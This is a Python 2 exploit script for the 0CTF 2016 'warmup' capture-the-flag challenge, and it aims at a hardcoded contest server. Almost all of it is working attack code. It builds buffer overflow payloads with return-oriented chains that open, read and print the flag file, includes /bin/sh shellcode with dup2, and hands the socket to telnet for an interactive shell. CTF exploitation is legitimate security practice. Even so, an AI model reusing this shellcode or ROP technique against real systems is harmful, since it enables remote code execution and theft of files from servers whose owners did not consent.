#!/usr/bin/python
# pwn.py for 0CTF2016.warmup
#@mrexcessive

import os, sys, code
import readline, rlcompleter
import socket
import time
import string
import struct
import telnetlib
import time

SERVER = "202.120.7.207"      # the actual challenge server
PORT = 52608

pauseDebugging = False     # use this when debugging locally
goTelnetAtEnd = True       # enable once you have some kind of expectation that it isn't all screwed up
                           # and you might actually get a shell

p = lambda x: struct.pack("<L", x)            # from https://gist.github.com/soez/4ee5eb07d4a3982815ad
u = lambda x: struct.unpack('<L', x)[0]
p64 = lambda x: struct.pack("<Q", x)
u64 = lambda x: struct.unpack('<Q', x)[0]


localtest = False    # well for IOsmash there is _only_ local testing...
if localtest:
   #TESTING LOCALLY
   SERVER = "localhost"
   PORT = 1337

debug = True
alphanums = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
printables =   alphanums + ".,<>?/!$%^&*()_-+=@'#][{}`#"
s = None             # socket
old_data = ""        # response data not yet processed        


def HexPrint(what):
   #expects list of ints
   col = 0
   oplineA = ""
   oplineB = ""
   for c in what:
      b = ord(c)
      oplineA += "%02x " % b
      if not c in printables:
         c = '.'
      oplineB += c
      if col == 7:
         oplineA += "- "
      col += 1
      if col >= 16:
         print oplineA + ' ' * (53-len(oplineA)) + oplineB
         oplineA = ""
         oplineB = ""
         col = 0
   if oplineA <> "":     # final line if any
      print oplineA + ' ' * (53-len(oplineA)) + oplineB

def GetShellcode(FD = 0):
   dup2code = "\x31\xdb\xb3\xff\x5b\x31\xc9\x6a\x3f\x58\xcd\x80\x41\x6a\x3f\x58\xcd\x80\x41\x6a\x3f\x58\xcd\x80"
   shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\xbe\x2e\x61\x68\x6d\x81\xc6\x01\x01\x01\x01\x56\x89\xe3\x52\x53\x89\xe1\xcd\x80"
   sc = dup2code.replace("\xff",chr(FD & 0xff))
   useshellcode = sc + shellcode
   #useshellcode = "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80"     # the one I'm using for IOsmash

#   useshellcode = "\x6a\x04\x5b\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8"
#   useshellcode += "\x31\xc0\x99\x52\x68\x6e\x2f\x73"
#   useshellcode += "\x68\x68\x2f\x2f\x62\x69\x89\xe3"
#   useshellcode += "\x52\x89\xe2\x53\x89\xe1\xb0\x0b"
#   useshellcode += "\xcd\x80"

   print "Shellcode = [%s]" % useshellcode.encode("hex")
   print "shellcode length = %i" % len(useshellcode)
   return useshellcode


def DoConnect():
   global s
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((SERVER,PORT))
   assert(s <> None)

def GetResponse(expect="",timeout=1):
   global s, old_data
   s.setblocking(0)
   total_data=old_data
   begin = time.time()
   while True:
      if total_data <> "" and time.time() - begin > timeout:      # wait timeout sec if we have something
         break
      elif time.time() - begin > timeout * 2:               # wait 2xtimeout if nothing
         break
      try:
         data = s.recv(1024)
         if data:
            total_data += data
            if expect in total_data:
               total_data, old_data = total_data.split(expect,1)
               total_data += expect
               break
            begin = time.time()
         else:
            time.sleep(0.01)
      except:
         pass
   return total_data

def Send(v):
   if debug:
      sys.stdout.write(v)
      sys.stdout.flush()
   s.sendall(v)


def PwnServer():
   r = GetResponse(expect="!",timeout=2)
   print r
   fpbuf = 0x8049800

   if False:      # run to print "elcome..." then restart
      extract = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"
      extract += p(0x08048135)         # ROP directly to write()
      extract += p(0x080480e7)         # after write go back and restart program...
      extract += p(1)                  # <stdout>
      extract += p(0x80491bd)          # "elcome..."
      extract += p(20)                 #len
      s.send(extract + "\n")

   if False:
      # Rerun interact with LARGE input space... then rerun program
      extract = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"
      extract += p(0x0804811d)         # read()
      extract += p(0x080480e7)         # restart program after read()
      extract += p(0)                  # <stdin>
      extract += p(fpbuf)
      extract += p(0x20)               # read x20 chars
      s.send(extract)

      # now send the filepath
      fp = "/home/warmup/flag\0\n"
      s.send(fp)

      # OPEN() now we are running again from start, but with filepath in fpbuf
      # so... sys_open requires:
      # eax = 5 ; ebx = char* filepath ; ecx = flags ; edx = mode  # flags and mode both 0
      # invoke int0x80 via 0x8048122
      extract = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"
      extract += p(0x12345678)
      extract += p(0x08048122)         # int0x80 proxy
      extract += p(0x080480e7)         # restart program after open()
      extract += p(fpbuf)
#         extract += p(0) * 2              # flags and mode
      s.send(fp)

   time.sleep(4)    # wait for alarm to die a bit

   if True:    # open file using alarm() ; read+1() and restart()
      # setup filepath in fpbuf
      extract = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"
      extract += p(0x0804811d)         # read()
      extract += p(0x080480e7)         # restart program after read()
      extract += p(0)                  # <stdin>
      extract += p(fpbuf)
      fp = "/home/warmup/flag\0"
      extract += p(len(fp))
      s.send(extract)

      # now send the filepath
      s.send(fp)

      # now use alarm() to read a 5 (after sleep countdown from 10)
      # sys_read requires:
      # ebx = handle (guess this, low number >2) ; ecx = &buf (reuse fpbuf) ; edx = size == 0x30
      extract = "A1A1B1B1C1C1D1D1E1E1F1F1G1G1H1H1"    # 0x20 bytes to here
      extract += p(0x0804810d)         # alarm()
      extract += p(0x08048122)         # return from alarm(): read+1 being used for open()
      extract += p(0x080480e7)         # return from open(): restart program _and_ new alarm time for alarm()
      extract += p(fpbuf)              # fname for open()
      extract += p(0x100)              # flags for open()
      s.send(extract)


   if True:    # assuming we have file handle (3) at this point

      # READ() now we have file open... read contents to the buffer
      # sys_read requires:
      # ebx = handle (guess this, low number >2) ; ecx = &buf (reuse fpbuf) ; edx = size == 0x30
      extract = "a1a1b1b1c1c1d1d1e1e1f1f1g1g1h1h1"
      extract += p(0x0804811d)         # read()
      extract += p(0x080480e7)         # restart program after read()
      extract += p(3)
      extract += p(fpbuf)
      extract += p(0x40)
      s.send(extract)
      
      # WRITE() to stdout
      extract = "a2a2b2b2c2c2d2d2e2e2f2f2g2g2h2h2"
      extract += p(0x08048135)         # ROP directly to write()
      extract += p(0x080480e7)         # after write go back and restart program...
      extract += p(1)                  # <stdout>
      extract += p(fpbuf)              # "elcome..."
      extract += p(0x40)               #len
      s.send(extract + "\n")

   r = GetResponse(timeout=1)
   HexPrint(r)


if __name__ == "__main__":
   vars = globals()
   vars.update(locals())
   readline.set_completer(rlcompleter.Completer(vars).complete)
   readline.parse_and_bind("tab: complete")
   shell = code.InteractiveConsole(vars)
   # any startups

   DoConnect()
   if pauseDebugging and localtest:
      print "Attach debugger then press <Enter>"
      raw_input()
   if True:
      PwnServer()

   if goTelnetAtEnd:
      t = telnetlib.Telnet()
      t.sock = s
      t.interact()

   # go interactive   
   #shell.interact()    # exit... cos... reasons
